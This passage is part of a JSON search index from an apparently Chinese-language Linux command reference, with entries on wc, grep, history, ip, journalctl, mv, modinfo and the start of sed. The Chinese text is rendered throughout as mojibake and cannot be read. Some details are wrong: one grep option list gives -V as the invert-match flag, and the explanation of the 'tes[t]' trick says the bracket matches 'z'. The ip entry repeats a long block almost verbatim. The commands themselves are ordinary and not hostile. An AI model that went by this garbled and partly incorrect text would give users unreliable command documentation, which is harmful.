ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ã€‚ è¯­æ³•: wc [-clw][--help][--version][æ–‡ä»¶...] å‚æ•° -c , --bytes , --chars åªæ˜¾ç¤ºBytesæ•°ã€‚ -l , --lines æ˜¾ç¤ºè¡Œæ•°ã€‚ -w , --words åªæ˜¾ç¤ºå­—æ•°ã€‚ä¸€ä¸ªå­—è¢«å®šä¹‰ä¸ºç”±ç©ºç™½ã€è·³æ ¼æˆ–æ¢è¡Œå­—ç¬¦åˆ†éš”çš„å­—ç¬¦ä¸² -m ç»Ÿè®¡å­—ç¬¦æ•°ã€‚è¿™ä¸ªæ ‡å¿—ä¸èƒ½ä¸ -c æ ‡å¿—ä¸€èµ·ä½¿ç”¨ã€‚ -L æ‰“å°æœ€é•¿è¡Œçš„é•¿åº¦ã€‚ --help åœ¨çº¿å¸®åŠ©ã€‚ --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ æ³¨è§£ é»˜è®¤æƒ…å†µä¸‹, æ˜¾ç¤º è¡Œæ•°ã€å•è¯æ•°ï¼Œä»¥åŠå­—èŠ‚æ•°. æ”¯æŒå¤šä¸ªæ–‡ä»¶ç»Ÿè®¡æ€»æ•°. ç”¨ä¾‹ è®¡ç®—å½“å‰æ–‡ä»¶å¤¹ä¸‹è§†é¢‘æ•°(mp4æ–‡ä»¶ä¸ªæ•°): ls *.mp4 | wc -l","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Finish.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Finish.html"},{"title":"grep","text":"ç”¨äºæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ã€‚ grep æŒ‡ä»¤ç”¨äºæŸ¥æ‰¾å†…å®¹åŒ…å«æŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶ï¼Œå¦‚æœå‘ç°æŸæ–‡ä»¶çš„å†…å®¹ç¬¦åˆæ‰€æŒ‡å®šçš„èŒƒæœ¬æ ·å¼ï¼Œé¢„è®¾ grep æŒ‡ä»¤ä¼šæŠŠå«æœ‰èŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—æ˜¾ç¤ºå‡ºæ¥ã€‚ è‹¥ä¸æŒ‡å®šä»»ä½•æ–‡ä»¶åç§°ï¼Œæˆ–æ˜¯æ‰€ç»™äºˆçš„æ–‡ä»¶åä¸º -ï¼Œåˆ™ grep æŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ã€‚ è¯­æ³•: grep [-abcEFGhHilLnqrsvVwxy][-A<æ˜¾ç¤ºè¡Œæ•°>][-B<æ˜¾ç¤ºåˆ—æ•°>][-C<æ˜¾ç¤ºåˆ—æ•°>][-d<è¿›è¡ŒåŠ¨ä½œ>][-e<èŒƒæœ¬æ ·å¼>][-f<èŒƒæœ¬æ–‡ä»¶>][--help][èŒƒæœ¬æ ·å¼][æ–‡ä»¶æˆ–ç›®å½•...] é€‰é¡¹å‚æ•°(å¸¸ç”¨) -E åœ¨æ‰©å±•æ­£åˆ™æ¨¡å¼ä¸‹ -P åœ¨Perlæ­£åˆ™æ¨¡å¼ä¸‹ -V å°†ä¸åŒ¹é…çš„è¿‡æ»¤å‡ºæ¥ -r é€’å½’æŸ¥æ‰¾ -r , -R é€’å½’æŸ¥æ‰¾ -q å®‰é™æ¨¡å¼ï¼Œä¸åœ¨å±å¹•ä¸Šè¾“å‡º -i å¿½ç•¥å¤§å°å†™ -n å¢åŠ è¡Œå· -o åªè¾“å‡ºæ–‡ä»¶ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ† -m <num> , --max-count= <num> æ‰¾åˆ°numè¡Œç»“æœååœæ­¢æŸ¥æ‰¾ï¼Œç”¨æ¥é™åˆ¶åŒ¹é…è¡Œæ•° --color çº¢è‰²è¾“å‡º å…¨éƒ¨å¯å‚è€ƒ: Linux grep å‘½ä»¤ è·å–æ–‡ä»¶å†…å®¹æ‰€åœ¨è¡Œ: cat file | grep -n 'xxx' | cut -d ':' -f 1 # æˆ–è€… grep -n 'xxx' file | cut -d ':' -f 1 æœç´¢dataæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶, æ˜¯å¦åŒ…å«pack: grep -r \"pack\" data å…¨éƒ¨é€‰é¡¹ -a , --text ä¸è¦å¿½ç•¥äºŒè¿›åˆ¶çš„æ•°æ®ã€‚ -A <æ˜¾ç¤ºè¡Œæ•°> , --after-context= <æ˜¾ç¤ºè¡Œæ•°> é™¤äº†æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹åçš„å†…å®¹ã€‚ -b , --byte-offset åœ¨æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å‰ï¼Œæ ‡ç¤ºå‡ºè¯¥è¡Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç¼–å·ã€‚ -B <æ˜¾ç¤ºè¡Œæ•°> , --before-context= <æ˜¾ç¤ºè¡Œæ•°> é™¤äº†æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹å‰çš„å†…å®¹ã€‚ -c , --count è®¡ç®—ç¬¦åˆæ ·å¼çš„åˆ—æ•°ã€‚ -C <æ˜¾ç¤ºè¡Œæ•°> , --context= <æ˜¾ç¤ºè¡Œæ•°> æˆ–è€…ç›´æ¥ -<æ˜¾ç¤ºè¡Œæ•°> . é™¤äº†æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å¤–ï¼Œå¹¶æ˜¾ç¤ºè¯¥è¡Œä¹‹å‰åçš„å†…å®¹ã€‚ -d <åŠ¨ä½œ> , --directories= <åŠ¨ä½œ> å½“æŒ‡å®šè¦æŸ¥æ‰¾çš„æ˜¯ç›®å½•è€Œéæ–‡ä»¶æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è¿™é¡¹å‚æ•°ï¼Œå¦åˆ™grepæŒ‡ä»¤å°†å›æŠ¥ä¿¡æ¯å¹¶åœæ­¢åŠ¨ä½œã€‚ -e <èŒƒæœ¬æ ·å¼> , --regexp= <èŒƒæœ¬æ ·å¼> æŒ‡å®šå­—ç¬¦ä¸²åšä¸ºæŸ¥æ‰¾æ–‡ä»¶å†…å®¹çš„æ ·å¼ã€‚ -E , --extended-regexp å°†æ ·å¼ä¸ºå»¶ä¼¸çš„æ­£åˆ™è¡¨è¾¾å¼æ¥ä½¿ç”¨ã€‚ -f <è§„åˆ™æ–‡ä»¶> , --file= <è§„åˆ™æ–‡ä»¶> æŒ‡å®šè§„åˆ™æ–‡ä»¶ï¼Œå…¶å†…å®¹å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè§„åˆ™æ ·å¼ï¼Œè®©grepæŸ¥æ‰¾ç¬¦åˆè§„åˆ™æ¡ä»¶çš„æ–‡ä»¶å†…å®¹ï¼Œæ ¼å¼ä¸ºæ¯è¡Œä¸€ä¸ªè§„åˆ™æ ·å¼ã€‚ -F , --fixed-regexp å°†æ ·å¼è§†ä¸ºå›ºå®šå­—ç¬¦ä¸²çš„åˆ—è¡¨ã€‚ -G , --basic-regexp å°†æ ·å¼è§†ä¸ºæ™®é€šçš„è¡¨ç¤ºæ³•æ¥ä½¿ç”¨ã€‚ -h , --no-filename åœ¨æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å‰ï¼Œä¸æ ‡ç¤ºè¯¥è¡Œæ‰€å±çš„æ–‡ä»¶åç§°ã€‚ -H , --with-filename åœ¨æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å‰ï¼Œè¡¨ç¤ºè¯¥è¡Œæ‰€å±çš„æ–‡ä»¶åç§°ã€‚ -i , --ignore-case å¿½ç•¥å­—ç¬¦å¤§å°å†™çš„å·®åˆ«ã€‚ -l , --file-with-matches åˆ—å‡ºæ–‡ä»¶å†…å®¹ç¬¦åˆæŒ‡å®šçš„æ ·å¼çš„æ–‡ä»¶åç§°ã€‚ -L , --files-without-match åˆ—å‡ºæ–‡ä»¶å†…å®¹ä¸ç¬¦åˆæŒ‡å®šçš„æ ·å¼çš„æ–‡ä»¶åç§°ã€‚ -n , --line-number åœ¨æ˜¾ç¤ºç¬¦åˆæ ·å¼çš„é‚£ä¸€è¡Œä¹‹å‰ï¼Œæ ‡ç¤ºå‡ºè¯¥è¡Œçš„åˆ—æ•°ç¼–å·ã€‚ -o , --only-matching åªæ˜¾ç¤ºåŒ¹é…PATTERN éƒ¨åˆ†ã€‚ -q , --quiet , --silent ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚ -r , --recursive æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š\"-d recurse\"å‚æ•°ç›¸åŒã€‚ -s , --no-messages ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚ -v , --invert-match æ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œã€‚ -V , --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -w , --word-regexp åªæ˜¾ç¤ºå…¨å­—ç¬¦åˆçš„åˆ—ã€‚ -x , --line-regexp åªæ˜¾ç¤ºå…¨åˆ—ç¬¦åˆçš„åˆ—ã€‚ -y æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š\"-i\"å‚æ•°ç›¸åŒã€‚ grepå»é™¤æœ¬èº« æœ‰ä¸ªå°æŠ€å·§, ä¸psç»“åˆçš„æ—¶å€™, grepçš„ç»“æœå¾€å¾€ä¼šåŒ…å«grepå½“å‰æŸ¥è¯¢æœ¬èº«, é‚£ä¹ˆå¦‚ä½•å»æ‰? æ­»åŠæ³•: ps | grep test | grep -v grep ä¼˜é›…ç‚¹: ps | grep \"tes[t]\" ç¨å¾®è§£é‡Šä¸€ä¸‹, [t] è¡¨ç¤ºä¸€ä¸ªæ­£åˆ™, åªèƒ½é€‰æ‹©å­—ç¬¦ z, ä¸ç›´æ¥æŸ¥è¯¢æ•ˆæœæ˜¯ä¸€è‡´çš„, èƒ½æ’å‡ºæ‰grepæœ¬èº«, æ˜¯å› ä¸ºè¿™æ—¶å€™grepè¿›ç¨‹å¤§è‡´é•¿è¿™: ps | grep \"tes[t]\" ä¸ä¼šè§£ææ­£åˆ™, æ‰€ä»¥å¯ä»¥ç›´æ¥æ’é™¤æ‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GREP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GREP.html"},{"title":"history","text":"å‘½ä»¤å†å²","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-History.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-History.html"},{"title":"ip","text":"è‹¥æ— åˆ™å®‰è£…: apt install iproute2 æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ è¯­æ³•: ip [option] [åŠ¨ä½œ] [æŒ‡ä»¤] é€‰é¡¹ä¸å‚æ•° æ”¯å‡ºçš„é€‰é¡¹/å‘½ä»¤: -s : s link : link address, a : address route, r : route s è¯´æ˜: ip -s # æ˜¾ç¤ºè¯¥è£…ç½®çš„ç»Ÿè®¡æ•°æ® # åé¢å¯è·Ÿå‚æ•° link # å…³äºè®¾å¤‡çš„ç›¸å…³è®¾å®šï¼ŒåŒ…æ‹¬MTU Macåœ°å€ç­‰ addr/address # å…³äºé¢å¤–çš„ipåè®®ã€‚ä¾‹å¦‚å¤šipçš„è¾¾æˆ route # ä¸è·¯ç”±ç›¸å…³çš„è®¾å®š link è¯´æ˜: ip link # åé¢å¯è·Ÿå‚æ•° show # ä»…æ˜¾ç¤ºå‡ºä¸è¿™ä¸ªè£…ç½®ç›¸å…³çš„å†…å®¹ set # å¯ä»¥å¼€å§‹è®¾å®šé¡¹ç›®ï¼ŒdeviceæŒ‡çš„æ˜¯eth0ç­‰ç•Œé¢ä»£å· # setæ”¯æŒå‚æ•° up|down # å¯åŠ¨æˆ–è€…å…³é—­æŸä¸ªæ¥å£ address # å¦‚æœè¿™ä¸ªè£…ç½®å¯ä»¥ä¿®æ”¹macåœ°å€ï¼Œç”¨è¿™ä¸ªä¿®æ”¹ name # å‘½å mtu # æœ€å¤§ä¼ è¾“å•å…ƒ address æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ è¯´æ˜: # æˆ–è€… ip a ip address # åé¢å¯è·Ÿå‚æ•° show # æ˜¾ç¤ºæ¥å£ipä¿¡æ¯. é»˜è®¤å°±æ˜¯æ­¤å‚æ•° add|del # æ·»åŠ /åˆ é™¤ç›¸å…³è®¾å®š # æ”¯æŒå‚æ•° ip # ä¸»è¦å°±æ˜¯ç½‘åŸŸçš„è®¾å®š dev # è¿™ä¸ªipå‚æ•°è®¾å®šçš„æ¥å£ å¦‚eth0ï¼Œ # åŒ…å«çš„å‚æ•°å¦‚ä¸‹ broadcast # è®¾å®šå¹¿æ’­åœ°å€ï¼Œå¦‚æœè®¾å®šå€¼æ˜¯+ï¼Œè¡¨ç¤ºè‡ªåŠ¨è®¾ç½® label # è£…ç½®çš„åˆ«å ä¾‹å¦‚ eth0:0 scope # è¿™ä¸ªç•Œé¢çš„é¢†åŸŸï¼Œ # æœ‰ä»¥ä¸‹å‡ ç±» global # å…è®¸æ¥è‡ªæ‰€æœ‰æ¥æºçš„è”æœº site # ä»…æ”¯æŒipv6 ä»…å…è®¸æœ¬ä¸»æœºçš„è”æœº link # ä»…å…è®¸æœ¬è£…ç½®è‡ªæˆ‘è”æœº host # ä»…å…è®¸ä¸»æœºå†…éƒ¨è”æœº è¾“å‡ºå‚æ•°è¯¦è§£ï¼š lo å…¨ç§°loopbackï¼Œæ˜¯å›ç¯åœ°å€ï¼Œç»å¸¸è¢«åˆ†é…åˆ°127.0.0.1åœ°å€ä¸Šï¼Œç”¨äºæœ¬æœºé€šä¿¡ï¼Œç»è¿‡å†…æ ¸å¤„ç†åç›´æ¥è¿”å›ï¼Œä¸ä¼šåœ¨ä»»ä½•ç½‘ç»œä¸­å‡ºç°ã€‚ eth0 ç½‘å¡åï¼Œå¦‚æœæœ‰å¤šå—ç½‘å¡ï¼Œä¼šæœ‰å¤šä¸ªeth æˆ–å…¶å®ƒåç§°ã€‚ link/ether è¿™ä¸ªæ˜¯MACåœ°å€ï¼Œå”¯ä¸€çš„ï¼Œä¸€å—ç½‘å¡ä¸€ä¸ªMACã€‚ inet ç½‘å¡ä¸Šç»‘å®šçš„IPåœ°å€ï¼Œé€šå¸¸æ‰€è¯´çš„IPV4ï¼Œä¸€å—ç½‘å¡å¯ä»¥ç»‘å®šå¤šä¸ªIPåœ°å€ã€‚åœ¨ç»‘å®šIPåœ°å€æ—¶æ³¨æ„ï¼šwindowsä¸»æœºä¼šæç¤ºIPåœ°å€å†²çªï¼Œè€Œlinuxä¸»æœºæ— ä»»ä½•æç¤ºï¼Œåœ¨æ·»åŠ æ–°çš„IPåœ°å€æ—¶åŠ¡å¿…æ£€æµ‹ä¸€ä¸‹æ–°åœ°å€æ˜¯å¦å’ŒåŸæœ‰åœ°å€å†²çªï¼Œé¿å…é€ æˆè®¿é—®ä¸å¯ç”¨ã€‚å¸¸ç”¨æ£€æµ‹å‘½ä»¤ï¼špingæˆ–arping IPï¼› inet6 IPV6åœ°å€ï¼Œæš‚æ—¶æ²¡æœ‰ï¼Œé¢„ç•™ã€‚ ç½‘ç»œè®¾å¤‡çŠ¶æ€æ ‡è¯†: <BROADCAST,MULTICAST,UP,LOWER_UP> UP ç½‘å¡å¤„äºå¯åŠ¨çŠ¶æ€ã€‚ BROADCAST ç½‘å¡æœ‰å¹¿æ’­åœ°å€ï¼Œå¯ä»¥å‘ç”Ÿå¹¿æ’­åŒ…ã€‚ MULTICAST ç½‘å¡å¯ä»¥å‘ç”Ÿå¤šæ’­åŒ…ã€‚ LOWER_UP L1æ˜¯å¯åŠ¨çš„ï¼Œå³ç½‘çº¿æ˜¯æ’ç€çš„ã€‚ <BROADCAST,MULTICAST,UP,LOWER_UP> è¿™ä¸ªé…ç½®ä¸²å‘Šè¯‰æˆ‘ä»¬ï¼š BROADCAST è¯¥æ¥å£æ”¯æŒå¹¿æ’­ MULTICAST è¯¥æ¥å£æ”¯æŒå¤šæ’­ UP ç½‘ç»œæ¥å£å·²å¯ç”¨ LOWER_UP ç½‘ç»œç”µç¼†å·²æ’å…¥ï¼Œè®¾å¤‡å·²è¿æ¥è‡³ç½‘ç»œ åˆ—å‡ºçš„å…¶ä»–å€¼ä¹Ÿå‘Šè¯‰äº†æˆ‘ä»¬å¾ˆå¤šå…³äºæ¥å£çš„çŸ¥è¯†ï¼Œ ä½†æˆ‘ä»¬éœ€è¦çŸ¥é“ brd å’Œ qlen è¿™äº›è¯ä»£è¡¨ä»€ä¹ˆæ„æ€ã€‚ æ‰€ä»¥ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ä¸Šé¢å±•ç¤ºçš„ ip ä¿¡æ¯çš„å…¶ä½™éƒ¨åˆ†çš„ç¿»è¯‘: mtu 1500 æœ€å¤§ä¼ è¾“å•ä½ï¼ˆæ•°æ®åŒ…å¤§å°ï¼‰ä¸º1,500å­—èŠ‚ qdisc pfifo_fast ç”¨äºæ•°æ®åŒ…æ’é˜Ÿ state UP ç½‘ç»œæ¥å£å·²å¯ç”¨ group default æ¥å£ç»„ qlen 1000 ä¼ è¾“é˜Ÿåˆ—é•¿åº¦ link/ether 00:1e:4f:c8:43:fc æ¥å£çš„ MACï¼ˆç¡¬ä»¶ï¼‰åœ°å€ brd ff:ff:ff:ff:ff:ff å¹¿æ’­åœ°å€ inet 192.168.0.24/24 IPv4 åœ°å€ brd 192.168.0.255 å¹¿æ’­åœ°å€ scope global å…¨å±€æœ‰æ•ˆ dynamic enp0s25 åœ°å€æ˜¯åŠ¨æ€åˆ†é…çš„ valid_lft 80866sec IPv4 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™ preferred_lft 80866sec IPv4 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ inet6 fe80::2c8e:1de0:a862:14fd/64 IPv6 åœ°å€ scope link ä»…åœ¨æ­¤è®¾å¤‡ä¸Šæœ‰æ•ˆ valid_lft forever IPv6 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™ preferred_lft forever IPv6 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ route æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ è¯´æ˜: # æˆ–è€… ip r ip route # åé¢å¯è·Ÿå‚æ•° show # å•çº¯æ˜¾ç¤ºè·¯ç”±è¡¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨list. é»˜è®¤å°±æ˜¯æ­¤å‚æ•° add|del # æ”¯æŒå‚æ•° IP|ç½‘åŸŸ # å¯ä»¥ä½¿ç”¨192.168.170.0/24è¿™æ ·çš„ç½‘åŸŸæˆ–è€…å•çº¯çš„ip via # ä»é‚£ä¸ªgatewayå‡ºå»ï¼Œä¸ä¸€å®šéœ€è¦ dev # ç”±é‚£ä¸ªè£…ç½®è¿æ¥å‡ºå»ï¼Œéœ€è¦ mtu # é¢å¤–è®¾å®šMTUçš„æ•°å€¼ è¾“å‡ºè¯¦è§£ loï¼šå…¨ç§°loopbackï¼Œæ˜¯å›ç¯åœ°å€ï¼Œç»å¸¸è¢«åˆ†é…åˆ°127.0.0.1åœ°å€ä¸Šï¼Œç”¨äºæœ¬æœºé€šä¿¡ï¼Œç»è¿‡å†…æ ¸å¤„ç†åç›´æ¥è¿”å›ï¼Œä¸ä¼šåœ¨ä»»ä½•ç½‘ç»œä¸­å‡ºç°ã€‚ eth0ï¼šç½‘å¡åï¼Œå¦‚æœæœ‰å¤šå—ç½‘å¡ï¼Œä¼šæœ‰å¤šä¸ªeth æˆ–å…¶å®ƒåç§°ã€‚ link/etherï¼šè¿™ä¸ªæ˜¯MACåœ°å€ï¼Œå”¯ä¸€çš„ï¼Œä¸€å—ç½‘å¡ä¸€ä¸ªMACã€‚ inetï¼šç½‘å¡ä¸Šç»‘å®šçš„IPåœ°å€ï¼Œé€šå¸¸æ‰€è¯´çš„IPV4ï¼Œä¸€å—ç½‘å¡å¯ä»¥ç»‘å®šå¤šä¸ªIPåœ°å€ã€‚åœ¨ç»‘å®šIPåœ°å€æ—¶æ³¨æ„ï¼šwindowsä¸»æœºä¼šæç¤ºIPåœ°å€å†²çªï¼Œè€Œlinuxä¸»æœºæ— ä»»ä½•æç¤ºï¼Œåœ¨æ·»åŠ æ–°çš„IPåœ°å€æ—¶åŠ¡å¿…æ£€æµ‹ä¸€ä¸‹æ–°åœ°å€æ˜¯å¦å’ŒåŸæœ‰åœ°å€å†²çªï¼Œé¿å…é€ æˆè®¿é—®ä¸å¯ç”¨ã€‚å¸¸ç”¨æ£€æµ‹å‘½ä»¤ï¼špingæˆ–arping IPï¼› inet6ï¼šIPV6åœ°å€ï¼Œæš‚æ—¶æ²¡æœ‰ï¼Œé¢„ç•™ã€‚ ç½‘ç»œè®¾å¤‡çŠ¶æ€æ ‡è¯†ï¼š<BROADCAST,MULTICAST,UP,LOWER_UP> UPï¼šç½‘å¡å¤„äºå¯åŠ¨çŠ¶æ€ã€‚ BROADCASTï¼šç½‘å¡æœ‰å¹¿æ’­åœ°å€ï¼Œå¯ä»¥å‘ç”Ÿå¹¿æ’­åŒ…ã€‚ MULTICASTï¼šç½‘å¡å¯ä»¥å‘ç”Ÿå¤šæ’­åŒ…ã€‚ LOWER_UPï¼šL1æ˜¯å¯åŠ¨çš„ï¼Œå³ç½‘çº¿æ˜¯æ’ç€çš„ã€‚ <BROADCAST,MULTICAST,UP,LOWER_UP è¿™ä¸ªé…ç½®ä¸²å‘Šè¯‰æˆ‘ä»¬: BROADCAST è¯¥æ¥å£æ”¯æŒå¹¿æ’­ MULTICAST è¯¥æ¥å£æ”¯æŒå¤šæ’­ UP ç½‘ç»œæ¥å£å·²å¯ç”¨ LOWER_UP ç½‘ç»œç”µç¼†å·²æ’å…¥ï¼Œè®¾å¤‡å·²è¿æ¥è‡³ç½‘ç»œ åˆ—å‡ºçš„å…¶ä»–å€¼ä¹Ÿå‘Šè¯‰äº†æˆ‘ä»¬å¾ˆå¤šå…³äºæ¥å£çš„çŸ¥è¯†ï¼Œä½†æˆ‘ä»¬éœ€è¦çŸ¥é“ brd å’Œ qlen è¿™äº›è¯ä»£è¡¨ä»€ä¹ˆæ„æ€ã€‚ æ‰€ä»¥ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ä¸Šé¢å±•ç¤ºçš„ ip ä¿¡æ¯çš„å…¶ä½™éƒ¨åˆ†çš„ç¿»è¯‘: mtu 1500 æœ€å¤§ä¼ è¾“å•ä½ï¼ˆæ•°æ®åŒ…å¤§å°ï¼‰ä¸º1,500å­—èŠ‚ qdisc pfifo_fast ç”¨äºæ•°æ®åŒ…æ’é˜Ÿ state UP ç½‘ç»œæ¥å£å·²å¯ç”¨ group default æ¥å£ç»„ qlen 1000 ä¼ è¾“é˜Ÿåˆ—é•¿åº¦ link/ether 00:1e:4f:c8:43:fc æ¥å£çš„ MACï¼ˆç¡¬ä»¶ï¼‰åœ°å€ brd ff:ff:ff:ff:ff:ff å¹¿æ’­åœ°å€ inet 192.168.0.24/24 IPv4 åœ°å€ brd 192.168.0.255 å¹¿æ’­åœ°å€ scope global å…¨å±€æœ‰æ•ˆ dynamic enp0s25 åœ°å€æ˜¯åŠ¨æ€åˆ†é…çš„ valid_lft 80866sec IPv4 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™ preferred_lft 80866sec IPv4 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ inet6 fe80::2c8e:1de0:a862:14fd/64 IPv6 åœ°å€ scope link ä»…åœ¨æ­¤è®¾å¤‡ä¸Šæœ‰æ•ˆ valid_lft forever IPv6 åœ°å€çš„æœ‰æ•ˆä½¿ç”¨æœŸé™ preferred_lft forever IPv6 åœ°å€çš„é¦–é€‰ç”Ÿå­˜æœŸ ä¾‹: root@6378b4ca047d:/# ip address show to 172.17.0.3/16 76: eth0@if77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default link-netnsid 0 inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IP.html"},{"title":"journalctl","text":"åœ¨ systemd ä¸‹, å†…æ ¸å’Œç³»ç»Ÿçš„ä¿¡æ¯éƒ½é€šè¿‡æ—¥å¿—æœåŠ¡ systemd-journald.service (åˆå journald )æ¥è®°å½•ï¼Œ æ”¾åœ¨ /var/log/journal ä¸‹çš„ä¸å˜çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œ æˆ–æ”¾åœ¨\" /run/log/journal/ \"ä¸‹çš„å˜åŒ–çš„äºŒè¿›åˆ¶æ•°æ®. è¿™äº›äºŒè¿›åˆ¶æ—¥å¿—æ•°æ®ï¼Œå¯ä»¥é€šè¿‡ journalctl å‘½ä»¤æ¥è®¿é—®ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥æ˜¾ç¤ºä»æœ€åä¸€æ¬¡å¯åŠ¨ä»¥æ¥çš„æ—¥å¿—ï¼ŒæŒ‰å¦‚ä¸‹æ‰€ç¤º: journalctl -b æ“ä½œ å‘½ä»¤ç‰‡æ®µ æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ç³»ç»ŸæœåŠ¡å’Œå†…æ ¸æ—¥å¿— \"journalctl -b --system\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„å½“å‰ç”¨æˆ·çš„æœåŠ¡æ—¥å¿— \"journalctl -b --user\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ \"$unit\" å·¥ä½œæ—¥å¿— \"journalctl -b -u $unit\" æŸ¥çœ‹ä»æœ€åä¸€æ¬¡å¯åŠ¨å¼€å§‹çš„ \"$unit\"çš„å·¥ä½œæ—¥å¿— (\"tail -f\" å¼æ ·) \"journalctl -b -u $unit -f\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Journalctl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Journalctl.html"},{"title":"mv","text":"ä¸ºæ–‡ä»¶æˆ–ç›®å½•æ”¹åã€æˆ–å°†æ–‡ä»¶æˆ–ç›®å½•ç§»å…¥å…¶å®ƒä½ç½®","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-MV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-MV.html"},{"title":"modinfo","text":"æ˜¾ç¤º Linux å†…æ ¸æ¨¡å—ä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Modinfo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Modinfo.html"},{"title":"sed","text":"æµå¼æ–‡æœ¬ç¼–è¾‘å™¨ åˆ©ç”¨è„šæœ¬æ¥å¤„ç†æ–‡æœ¬æ–‡ä»¶ã€‚ sed å¯ä¾ç…§è„šæœ¬çš„æŒ‡ä»¤æ¥å¤„ç†ã€ç¼–è¾‘æ–‡æœ¬æ–‡ä»¶ã€‚ Sed ä¸»è¦ç”¨æ¥è‡ªåŠ¨ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€ç®€åŒ–å¯¹æ–‡ä»¶çš„åå¤æ“ä½œã€ç¼–å†™è½¬æ¢ç¨‹åºç­‰ã€‚ è¯­æ³•: sed [-hnV][-e<script>][-f<scriptæ–‡ä»¶>][æ–‡æœ¬æ–‡ä»¶] é€‰é¡¹å‚æ•° -n , --quiet , --silent ä»…æ˜¾ç¤ºå¤„ç†åçš„ç»“æœ -e <script> , --expression= <script> æŒ‡å®šsedç¼–è¾‘å‘½ä»¤. ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ -i ç›´æ¥ä¿®æ”¹è¯»å–çš„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯è¾“å‡ºåˆ°ç»ˆç«¯ã€‚ -f <script> , --file= <script> ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶. ç›´æ¥å°† sed çš„åŠ¨ä½œå†™åœ¨ä¸€ä¸ªæ–‡ä»¶å†…ï¼Œ -f filename åˆ™å¯ä»¥è¿è¡Œ filename å†…çš„ sed åŠ¨ä½œï¼› -r sed 